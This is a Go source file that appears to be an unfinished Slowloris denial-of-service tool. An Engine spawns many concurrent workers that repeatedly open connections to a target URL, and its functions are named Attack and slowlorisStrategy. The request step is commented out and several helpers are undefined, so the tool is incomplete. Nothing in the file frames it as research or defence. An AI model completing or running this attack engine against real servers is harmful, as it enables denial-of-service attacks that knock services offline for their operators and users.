package main

import (
	"time"
)

type WorkerMessage struct {
	msgType int
	workerId uint
	msg string
	err error
}

const (
	WMExited = 1 << iota
	WMFailed = 1 << iota
	WMSuccess = 1 << iota
)

type Engine struct {
	url string
	concurrency uint
	activeWorkers uint

	attemptedConnections uint
	failedConnections uint
	successConnections uint
	interruptedConnections uint
}

func (ctx* Engine) processMessage(msg WorkerMessage) {
	switch msg.msgType {

	case WMExited:
		ctx.activeWorkers--
		logger.Debug("Worker (", msg.workerId, ") exited.", ctx.activeWorkers, " remaining.")

	default:
		panic("Unreachable state reached. Probably a bug.")
	}
}

func (ctx* Engine) slowlorisStrategy(id uint, sink chan WorkerMessage) {
	for {
		time.Sleep(time.Duration(100 * time.Millisecond))

		logger.Debug("W", id, "Attempting to connect")

		ctx.attemptedConnections++


		
		_, err := Connect(ctx.url)
		
		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.failedConnections++
			continue
		}
		
		// req := CreateRequest(ctx.url)


	}
}

func NewEngine(url string, concurrency uint) Engine {
	return Engine {
		url: url,
		concurrency: concurrency,
		activeWorkers: 0,
	}
}

func (ctx* Engine) Attack() {
	reportChannel := make(chan WorkerMessage)
	ctx.activeWorkers = 0

	logger.Info("Spawning workers...")
	for i := uint(0); i < ctx.concurrency; i++ {
		go ctx.slowlorisStrategy(i, reportChannel)
		ctx.activeWorkers++
	}
	
	loop: for {
		select {
		case msg := <-reportChannel:
			ctx.processMessage(msg)
			if ctx.activeWorkers <= 0 {
				break loop
			}
		default:
			time.Sleep(time.Duration(100 * time.Millisecond))
		}
	}

	logger.Info("Ending attack...")
}